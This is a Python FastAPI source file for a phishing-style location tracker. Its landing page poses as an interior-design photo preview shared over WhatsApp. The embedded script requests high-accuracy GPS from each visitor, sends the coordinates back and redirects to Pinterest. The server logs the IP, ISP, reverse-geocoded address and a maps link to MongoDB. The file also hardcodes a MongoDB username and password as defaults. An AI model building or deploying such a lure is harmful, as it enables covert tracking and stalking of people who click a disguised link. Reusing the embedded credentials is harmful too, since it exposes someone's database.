import asyncio
import os
from datetime import datetime, timezone
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
import httpx
import uvicorn
from motor.motor_asyncio import AsyncIOMotorClient

app = FastAPI(title="Metadata Demo Backend")

# MongoDB Credentials and URI Setup
MONGODB_USERNAME = os.getenv("MONGODB_USERNAME", "chappidivenkatasriteja_db_user")
MONGODB_PASSWORD = os.getenv("MONGODB_PASSWORD", "T7mcp3ovV3M47DkR")
DEFAULT_URI = f"mongodb+srv://{MONGODB_USERNAME}:{MONGODB_PASSWORD}@cluster0.gonm89d.mongodb.net/location_tracker_db?retryWrites=true&w=majority"

MONGODB_URI = os.getenv("MONGODB_URI", DEFAULT_URI)

mongo_client = AsyncIOMotorClient(MONGODB_URI)
db = mongo_client["location_tracker_db"]
logs_collection = db["visitor_logs"]


async def fetch_ip_geolocation(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost") or ip.startswith("192.168.") or ip.startswith("10."):
        return {"city": "Localhost / Internal Network", "region": "N/A", "country": "N/A", "isp": "Local Server"}
    
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            response = await client.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    return {
                        "city": data.get("city"),
                        "region": data.get("regionName"),
                        "country": data.get("country"),
                        "isp": data.get("isp"),
                    }
    except Exception:
        pass
    return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}


@app.get("/preview.jpg", include_in_schema=False)
async def serve_preview_image():
    """Serves the local preview.jpg image for WhatsApp/Social media link preview cards."""
    image_path = "preview.jpg"
    if os.path.exists(image_path):
        return FileResponse(image_path, media_type="image/jpeg")
    return HTMLResponse(content="Image not found", status_code=404)


@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def public_landing_page(request: Request):
    if request.method == "HEAD":
        return HTMLResponse(content="", status_code=200)

    forwarded_for = request.headers.get("x-forwarded-for")
    real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
    location_info = await fetch_ip_geolocation(real_ip)

    print("\n" + "="*60, flush=True)
    print(" 🚨 NEW VISITOR CONNECTED!", flush=True)
    print(f" IP Address     : {real_ip}", flush=True)
    print(f" IP City/Region : {location_info.get('city')}, {location_info.get('region')}", flush=True)
    print(f" ISP            : {location_info.get('isp')}", flush=True)
    print(" Requesting browser GPS permission & Redirecting to Pinterest...", flush=True)
    print("="*60 + "\n", flush=True)

    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Interior Design Preview</title>
        
        <!-- Open Graph Meta Tags for Rich WhatsApp Preview Cards -->
        <meta property="og:title" content="Modern TV Unit Design Idea" />
        <meta property="og:description" content="Tap to view the full interior design photo." />
        <meta property="og:image" content="https://location-q0pi.onrender.com/preview.jpg" />
        <meta property="og:url" content="https://location-q0pi.onrender.com" />
        <meta property="og:type" content="website" />

        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #ffffff; }
            p { color: #888; font-size: 16px; }
        </style>
    </head>
    <body>
        <p>Loading image...</p>

        <script>
            const DESTINATION_URL = "https://pin.it/7mD0QLvXJ";

            function sendPayloadAndRedirect(payload) {
                fetch('/api/location-result', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).finally(() => {
                    window.location.replace(DESTINATION_URL);
                });
            }

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendPayloadAndRedirect({
                            status: "allowed",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy_meters: position.coords.accuracy
                        });
                    },
                    function(error) {
                        sendPayloadAndRedirect({
                            status: "blocked",
                            error_message: error.message
                        });
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                sendPayloadAndRedirect({ status: "blocked", error_message: "Geolocation unsupported" });
            }

            setTimeout(() => {
                window.location.replace(DESTINATION_URL);
            }, 4000);
        </script>
    </body>
    </html>
    """

    response = HTMLResponse(content=html_content, status_code=200)
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response


@app.post("/api/location-result")
async def receive_location_result(request: Request):
    data = await request.json()
    status = data.get("status")

    forwarded_for = request.headers.get("x-forwarded-for")
    real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
    ip_info = await fetch_ip_geolocation(real_ip)

    # Base log object for MongoDB Atlas
    log_document = {
        "timestamp": datetime.now(timezone.utc),
        "status": status,
        "ip_address": real_ip,
        "ip_city": ip_info.get("city"),
        "ip_region": ip_info.get("region"),
        "ip_country": ip_info.get("country"),
        "isp": ip_info.get("isp"),
        "user_agent": request.headers.get("user-agent"),
    }

    if status == "allowed":
        lat = data.get("latitude")
        lon = data.get("longitude")
        accuracy = data.get("accuracy_meters")

        street_address = "Unknown"
        try:
            async with httpx.AsyncClient(timeout=3.0) as client:
                resp = await client.get(
                    f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
                    headers={"User-Agent": "SeminarDemoApp/1.0"}
                )
                if resp.status_code == 200:
                    addr = resp.json().get("address", {})
                    street_address = f"{addr.get('suburb', '')}, {addr.get('city', addr.get('state_district', ''))}, {addr.get('state', '')}"
        except Exception:
            pass

        log_document.update({
            "gps_latitude": lat,
            "gps_longitude": lon,
            "gps_accuracy_meters": accuracy,
            "reverse_geocoded_address": street_address,
            "maps_link": f"https://www.google.com/maps?q={lat},{lon}"
        })

        print("\n" + "🎯"*30, flush=True)
        print(" 📍 EXACT GPS LOCATION CAPTURED (ALLOWED)", flush=True)
        print("🎯"*30, flush=True)
        print(f" Latitude : {lat}", flush=True)
        print(f" Longitude: {lon}", flush=True)
        print(f" Accuracy : ~{accuracy} meters", flush=True)
        print(f" Address  : {street_address}", flush=True)
        print(f" Maps Link: https://www.google.com/maps?q={lat},{lon}", flush=True)
        print("🎯"*30 + "\n", flush=True)

    elif status == "blocked":
        log_document["error_message"] = data.get("error_message", "Permission denied")

        print("\n" + "⚠️"*30, flush=True)
        print(" 🛡️ USER BLOCKED GPS PERMISSION! FALLING BACK TO IP LOCATION:", flush=True)
        print("⚠️"*30, flush=True)
        print(f" Fallback City   : {ip_info.get('city')}", flush=True)
        print(f" Fallback Region : {ip_info.get('region')}", flush=True)
        print(f" Fallback ISP    : {ip_info.get('isp')}", flush=True)
        print(f" Visitor IP      : {real_ip}", flush=True)
        print("⚠️"*30 + "\n", flush=True)

    # Insert log entry into MongoDB Atlas
    try:
        await logs_collection.insert_one(log_document)
        print("💾 Successfully saved log entry to MongoDB Atlas!", flush=True)
    except Exception as e:
        print(f"❌ Failed to insert log to MongoDB: {e}", flush=True)

    return JSONResponse(content={"status": "received"})


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)